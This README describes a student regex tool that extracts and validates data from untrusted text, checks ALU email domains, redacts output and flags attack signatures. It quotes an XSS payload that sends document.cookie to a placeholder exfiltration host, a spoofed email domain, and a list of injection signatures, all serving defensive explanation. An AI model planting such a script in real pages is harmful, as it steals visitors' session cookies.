# ALU Regex Data Extraction & Secure Validation

A regex program that pulls structured data out of messy, untrusted text — the kind an external API actually returns — and writes a clean, redacted JSON report.

It handles all eight data types from the brief, validates the three ALU email domains, and treats every byte of input as hostile.

## Running it

Python 3.8+, no packages to install.

```bash
python3 src/main.py              # extract, and write output/sample-output.json
python3 src/main.py --self-test  # run the 34 edge-case tests
```

```
├── input/raw-text.txt          # messy, realistic, deliberately hostile input
├── src/main.py                 # extraction, validation and redaction
├── output/sample-output.json   # generated report
└── README.md
```

## How it works

Three stages, kept deliberately separate:

1. **Sanitise** — normalise Unicode, strip control characters, quarantine over-long lines, scan for attack signatures.
2. **Extract** — regex finds candidates by *shape*.
3. **Validate and redact** — Python decides whether each candidate is *real*, then masks it.

The split matters. A regex describes shape, not meaning. It can tell you something looks like a 16-digit card number; it can't tell you the checksum is valid. Cramming all that into one giant pattern gives you something nobody can read or debug. So the regex finds candidates and ordinary code decides what's genuine.

## What it extracts

All eight types, though only four were required:

| Type | Extra validation beyond the pattern |
|---|---|
| Emails | Local part ≤64 chars, DNS label rules, no doubled dots, plus ALU classification |
| URLs | `http`/`https` only, port range, no embedded credentials |
| Phone numbers | E.164 length 7–15, `(0)` trunk prefix removed, region labelled |
| Credit cards | **Luhn checksum**, length 13–19, issuer brand |
| Times | Ranges built into the pattern, normalised to 24h |
| HTML tags | Inventoried and risk-flagged — never parsed (see below) |
| Hashtags | Hex colours and HTML entities excluded |
| Currency | Prefix and suffix forms, thousands grouping |

## ALU email validation

Three anchored validators: `@alueducation.com`, `@alumni.alueducation.com`, `@si.alueducation.com`.

**The anchors are the whole point.** Without `^` and `$`, a search would accept:

```
k.mugisha@alueducation.com.attacker.net
```

because the required text *is* in there — it just isn't the whole string. That exact attack sits in the input file and the program rejects it, along with `@alumni.alueducation.co` (one letter short). This is the difference between searching and validating.

## Security

The input is never trusted. It's not executed, not run through a shell, not rendered as HTML, not used to build a query.

**Eleven threat signatures** — XSS, unsafe URI schemes, SQL and template and command injection, path traversal, CRLF, NoSQL operators, null bytes. The sample run catches 15 hostile constructs.

**Nothing sensitive appears in the output.** Cards show the last 4 digits only. Emails keep two characters and the domain. Hostile payloads are stored as SHA-256 fingerprints — enough to audit a finding, useless to anyone who steals the report.

**Two bugs worth mentioning**, because both taught me something:

The URL pattern originally extracted the callback server out of `<script>fetch('https://exfil.evil...'+document.cookie)</script>` and wrote `document.cookie` into the report. The URL was perfectly well-formed, so tightening the pattern couldn't fix it — the problem was *context*, not shape. Now anything found inside a hostile construct is quarantined too.

The SQL signature originally used a bare `--`, which fired on all ten `--- SECTION` headings in my own input file. A detector that cries wolf gets switched off, so it now requires an adjacent quote or semicolon. Detections dropped from 25 to 15, and all 15 are real.

**ReDoS resistance** — every quantifier is bounded, adjacent character classes are disjoint, and there are hard caps on file size, line length and match count.

**Honest limit:** a regex blocklist is a detection aid, not a security control. Real defence is parameterised queries and a proper sanitiser. These signatures show awareness and catch obvious attacks; they aren't exhaustive.

## Don't sanitise HTML with regex

`HTML_TAG_RE` only *inventories* tag-shaped tokens so dangerous ones get flagged. It never rebuilds markup, and it shouldn't.

HTML isn't a regular language — nesting, comments and malformed markup defeat any pattern you can write. Use a real parser plus a sanitiser like `bleach` or DOMPurify. The same rule returns in the web-scraping unit: DOM selectors to extract, regex only to clean the text afterwards.

## Edge cases

Run `--self-test` to see all 34. A few of the more interesting ones:

| Input | Result |
|---|---|
| `k@alueducation.com.attacker.net` | rejected — `$` anchor refuses the suffix |
| `4111 1111 1111 1112` | rejected — right shape, fails Luhn |
| `4111111111111111111111` | rejected and reported — 22 digits, not silently dropped |
| `#FF5733` | not a hashtag — it's a hex colour |
| `13:00 PM` / `24:00` | not times — out of range |
| `12:00 AM` → `00:00` | the classic off-by-twelve bug |
| `+250 (0)788 214 663` | 12 digits — `(0)` is a trunk prefix |
| `4111 1111 1111 1111` | counted as a card, not a phone |

## Results

```
 emails            17 valid,  2 rejected      ALU official : 5
 urls               6 valid,  4 rejected      ALU alumni   : 2
 phone_numbers      9 valid,  0 rejected      ALU SI       : 2
 credit_cards       4 valid,  3 rejected
 times             37 valid                   hostile patterns rejected: 15
 html_tags         14 valid,  7 rejected
 hashtags           9 valid
 currency_amounts  24 valid
```

The cards are the published network test numbers (Visa `4111…`, Amex `3782…`). No real card data appears anywhere in this repo.

## About the input

`input/raw-text.txt` imitates a partner CRM export: agent-typed tickets, gateway logs, a hand-pasted CSV, and a block of untrusted CMS HTML. It's deliberately inconsistent — mixed separators, stray spaces, both `12:00 PM` and `12:00` in the same document — because that's what production text looks like. Attack payloads are seeded throughout so the security path actually runs.

---

Built for the Front-end Web Development module at ALU.
